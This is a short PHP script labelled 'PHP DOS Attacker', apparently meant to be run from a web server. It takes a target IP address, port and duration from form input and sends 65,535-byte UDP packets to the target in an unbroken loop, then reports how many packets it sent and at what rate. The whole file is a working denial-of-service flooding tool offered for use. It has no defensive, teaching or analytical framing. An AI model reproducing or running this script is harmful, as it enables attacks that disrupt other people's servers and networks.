<?php

//=================================================
//PHP DOS Attacker. Version 1.2b
//Copyright Piwiky
//www.piwiky.net
//=================================================

$packets = 0;
$ip = $_POST['ip'];
$rand = $_POST['port'];
set_time_limit(0);
ignore_user_abort(FALSE);

$exec_time = $_POST['time'];

$time = time();
print "Flooded: $ip on port $rand <br><br>";
$max_time = $time+$exec_time;



for($i=0;$i<65535;$i++){
        $out .= "X";
}
while(1){
$packets++;
        if(time() > $max_time){
                break;
        }
        
        $fp = fsockopen("udp://$ip", $rand, $errno, $errstr, 5);
        if($fp){
                fwrite($fp, $out);
                fclose($fp);
        }
}
echo "Packet complete at ".time('h:i:s')." with $packets (" . round(($packets*65)/1024, 2) . " mB) packets averaging ". round($packets/$exec_time, 2) . " packets/s \n";
?>
<a href="http//www.piwiky.net/dos-attacker.php">Copyright Piwiky.net</a>
